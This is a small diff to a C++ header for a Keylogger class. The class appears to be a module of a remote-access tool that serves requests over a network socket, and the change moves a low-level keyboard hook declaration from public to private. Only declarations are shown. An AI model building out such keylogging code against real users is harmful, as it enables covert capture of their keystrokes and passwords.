@@ -15,9 +15,9 @@ class Keylogger : public FeatureHandler {
     static HINSTANCE hKeyboardInstance;
     static std::atomic_bool isShiftPressed;
     static std::atomic_bool isCapsLockOn;
+    static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam);
 public:
     static DWORD WINAPI SKeylogger();
     static void StopKeylogger();
-    static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam);
     void HandleRequest(SOCKET client_socket, const PacketHeader &header) override;
 };
